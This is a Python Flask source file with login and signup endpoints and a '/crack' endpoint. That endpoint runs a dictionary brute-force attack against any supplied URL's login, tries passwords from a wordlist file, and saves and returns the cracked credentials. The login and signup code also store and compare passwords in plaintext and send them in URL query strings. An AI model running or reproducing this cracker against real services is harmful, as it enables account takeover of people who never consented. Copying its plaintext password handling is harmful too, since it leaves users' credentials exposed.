from flask import Flask, request, jsonify, g
import sqlite3
import time

import requests
app = Flask(__name__)

DATABASE = 'users.db'


# SQLite database initialization
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_db(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


# Login API
@app.route('/login', methods=['GET'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')

    if not (username and password):
        return jsonify({'message': 'Username and password are required.'}), 400

    if len(password) < 8:
        return jsonify({'message': 'Password must be at least 8 characters long.'}), 400

    db = get_db()
    cursor = db.cursor()
    cursor.execute("SELECT * FROM users WHERE username=?", (username,))
    user = cursor.fetchone()

    if user and user['password'] == password:
        return jsonify({'message': 'Login successful.'}), 200
    else:
        return jsonify({'message': 'Invalid username or password.'}), 401

# Signup API
@app.route('/signup', methods=['POST'])
def signup():
    username = request.json.get('username')
    password = request.json.get('password')

    if not (username and password):
        return jsonify({'message': 'Username and password are required.'}), 400

    if len(password) < 8:
        return jsonify({'message': 'Password must be at least 8 characters long.'}), 400

    db = get_db()
    cursor = db.cursor()
    cursor.execute("SELECT * FROM users WHERE username=?", (username,))
    existing_user = cursor.fetchone()

    if existing_user:
        return jsonify({'message': 'Username already exists.'}), 409
    else:
        cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
        db.commit()
        return jsonify({'message': 'User created successfully.'}), 201

def create_req(username,password,url):
    newUrl = url + '?username=' + username + '&password=' + password
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.get(newUrl, headers=headers)
    return response

@app.route('/crack', methods=['POST'])
def crack():

        username = request.json.get('username')
        url = request.json.get('url')

        lines = open("text.txt",'r+').readlines()
        psw_list = [line.strip() for line in lines]
        start_time = time.time()

        f_r = open("hackedUser.txt", "r+")
        ext_users = [line.split(",") for line in f_r.readlines()]
        for i in ext_users:
            if(username in i):
                res = create_req(username,i[1],url)
                if res.status_code == 200:
                    password = i[1]
                    f_r.close()
                    break
        else:
            for i in psw_list:
                res = create_req(username, i, url)
                if res.status_code == 200:
                    f_a = open("hackedUser.txt","a+")
                    f_a.write(f"{username},{i},{url}")
                    f_a.close()
                    password = i
                    break

        end_time = time.time()

        return '{"username": "' + username + '", "password": "' + password + '" , "url" : "' + url + '", "time": "' + str(
            (end_time - start_time) // 1) + ' S"}'


if __name__ == '__main__':
    app.run()

